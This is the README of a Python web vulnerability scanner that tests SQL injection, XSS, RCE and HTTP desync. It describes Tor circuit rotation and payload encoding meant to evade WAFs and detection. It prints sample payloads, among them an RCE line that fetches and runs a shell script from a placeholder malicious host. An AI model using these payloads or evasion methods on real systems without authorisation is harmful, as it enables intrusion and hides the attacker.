# Advanced Web Scanner

This Python script scans web endpoints for vulnerabilities such as SQL Injection (SQLi), Cross-Site Scripting (XSS), Remote Code Execution (RCE), and HTTP Desynchronization (HTTP Desync). It uses a combination of different payloads, encoding techniques, and Tor for anonymity while testing the vulnerabilities.

## Features

- **Tor-based Anonymity**: The script routes all traffic through the Tor network to maintain anonymity.
- **Multiple Payloads**: A variety of payloads are used for different types of vulnerabilities, including evasion techniques.
- **Error Handling**: The script automatically retries failed requests and renews the Tor circuit to avoid detection and rate limiting.
- **Logging**: The script logs vulnerabilities found into separate files by type.

## Requirements

- Python 3.x
- [Tor](https://www.torproject.org/download/) (Tor client must be running locally on your machine)
- `requests` library
- `stem` library (Python Tor controller)
- `websocket-client` library

Install the required dependencies:

```bash
pip install requests stem websocket-client
```
## Configuration

Before running the script, make sure that the following configurations are set correctly:

    Tor Configuration:
        TOR_SOCKS5_PROXY: Set to the SOCKS5 proxy used by Tor (usually socks5h://127.0.0.1:9050).
        Tor Control Port: Ensure the Tor control port (9051 by default) is accessible.
        Tor Password: Set the password for authenticating with the Tor control port (you may need to configure this in the torrc file).

TOR_PASSWORD = "Passw0rd"  # Change this to your Tor password

## Payloads

The script uses a set of payloads for different vulnerability types:

    SQL Injection (SQLi): Payloads like ' OR '1'='1' -- to test SQL injection vulnerabilities.
    Cross-Site Scripting (XSS): Payloads like <img src='x' onerror='alert(1)'> to test XSS vulnerabilities.
    Remote Code Execution (RCE): Payloads like wget http://malicious.com/shell.sh | sh; to test RCE vulnerabilities.
    HTTP Desynchronization (Desync): Payloads like 0\r\n\r\nTRACE / HTTP/1.1\r\nHost: vulnerable.site\r\n to test HTTP desync vulnerabilities.

## How It Works

    Tor Circuit: The script uses Tor for anonymity, automatically renewing the Tor circuit after every 5 requests.
    Scanning: The script reads a list of endpoints from endpoints.txt and tests each endpoint with different types of payloads.
    Encoding: Payloads are encoded in various formats (default, URL encoding, Base64, and Hex) to evade detection mechanisms such as Web Application Firewalls (WAFs).
    Retries: If a request fails due to connection issues, the script retries a few times with random delays.
    WebSocket Support: Some payloads, like HTTP Desync, are sent via WebSocket for more advanced testing.
    Logging: If vulnerabilities are found, they are logged into separate files for each vulnerability type: res_sqli.txt, res_xss.txt, res_rce.txt, and res_http_desync.txt.

## How to Run

    Ensure Tor is running on your system. You can start Tor with the following command (assuming Tor is installed):
```bash
sudo systemctl start tor
```

Make sure you have the endpoints.txt file with a list of endpoints you want to scan. Each endpoint should be on a new line:

http://example.com
https://vulnerable-site.com

Run the Python script:

    python Advanced_ws.py

    The script will start scanning the endpoints and log the results into corresponding files.

Example Output

If the script finds any vulnerabilities, they will be logged in the following format:

[Vulnerability Type] Vulnerable: http://example.com?page=1' OR '1'='1' --
Curl: curl -X GET 'http://example.com?page=1%27%20OR%20%271%27%3D%271' --data ''

The results will be saved in the following files:

    res_sqli.txt for SQLi vulnerabilities
    res_xss.txt for XSS vulnerabilities
    res_rce.txt for RCE vulnerabilities
    res_http_desync.txt for HTTP Desync vulnerabilities

## Renewing Tor Circuit

To avoid detection, the script automatically renews the Tor circuit after every 5 requests by signaling Tor with the NEWNYM signal. This ensures that your IP address is changed frequently, maintaining anonymity.

## License

This script is provided as-is with no warranty. Feel free to use and modify it according to your needs. For educational purposes only. Ensure you have explicit permission before testing any website for vulnerabilities.

## Disclaimer

This script is intended for educational purposes and responsible security research only. Unauthorized use of this script to attack or exploit systems without explicit permission is illegal and unethical. Always obtain permission from the website owner or system administrator before performing security tests.
